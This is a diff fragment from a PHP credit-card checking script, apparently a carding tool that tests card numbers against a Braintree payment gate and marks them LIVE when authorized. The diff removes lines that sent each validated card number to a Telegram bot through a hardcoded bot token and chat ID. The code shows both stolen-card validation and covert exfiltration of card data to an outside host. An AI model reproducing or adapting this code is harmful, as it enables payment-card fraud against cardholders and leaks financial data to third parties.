@@ -161,9 +161,6 @@ else {
 
 if(strpos($execute, 'Thank you')){
 
-    $data = "Card%3A%20$lista%0AStatus%3A%20%23LIVE%0AMessage%3A%20Authorized%0AGate%3A%20Braintree%201%0ABot%20By%3A%20%40Raizo666";
-    file_get_contents('https://api.telegram.org/bot1445766483:AAGZQdjCZpkj0t4c5AECjObd1hOom0TGBeA/sendMessage?chat_id=1485192243&text='.$data.'');
-
     echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">Authorized</span></td></tr><br>';
 }
 elseif(strpos($execute, 'card verification number does not match')){
